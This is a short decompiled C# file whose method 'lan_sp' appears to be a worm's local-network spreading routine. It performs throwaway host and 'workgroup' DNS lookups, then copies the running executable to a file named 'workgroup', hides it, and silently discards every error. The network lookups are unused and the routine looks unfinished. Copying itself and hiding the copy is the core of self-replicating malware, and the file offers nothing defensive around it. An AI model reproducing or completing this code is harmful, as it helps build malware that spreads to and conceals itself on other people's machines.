using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication35;

[StandardModule]
internal sealed class lan
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void lan_sp()
	{
		try
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			hostAddresses[0].ToString();
			Dns.GetHostEntry("workgroup");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (File.Exists("workgroup"))
			{
				File.Delete("workgroup");
				FileSystem.FileCopy(Application.get_ExecutablePath(), "workgroup");
				File.SetAttributes("workgroup", FileAttributes.Hidden);
			}
			else
			{
				FileSystem.FileCopy(Application.get_ExecutablePath(), "workgroup");
				File.SetAttributes("workgroup", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
